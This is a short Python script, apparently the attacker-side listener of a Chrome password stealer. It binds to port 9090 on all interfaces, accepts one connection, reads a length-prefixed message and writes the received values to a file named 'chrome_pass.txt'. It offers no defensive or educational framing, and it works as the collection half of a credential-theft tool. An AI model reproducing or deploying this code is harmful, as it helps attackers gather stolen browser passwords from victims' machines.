import socket
import base64
import struct
import json
def recv_msg(sock):
	raw_msglen = recvall(sock, 4)
	if not raw_msglen:
		return None
	msglen = struct.unpack('>I', raw_msglen)[0]
	return recvall(sock, msglen)
def recvall(sock, n):
    # Helper function to recv n bytes or return None if EOF is hit
    data = bytearray()
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data+=packet
    return data
BUFF_SIZE=4096
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(("0.0.0.0", 9090))
sock.listen(1)
conn, addr=sock.accept()
encoded=recv_msg(conn)
print("Gathering data.....")
encoded=encoded.decode()
print(encoded)
print(type(encoded))
li = list(encoded.split(" "))
file=open("chrome_pass.txt", mode='w')
for i in li:
	file.write("\n{}".format(i))
file.close()
conn.close()
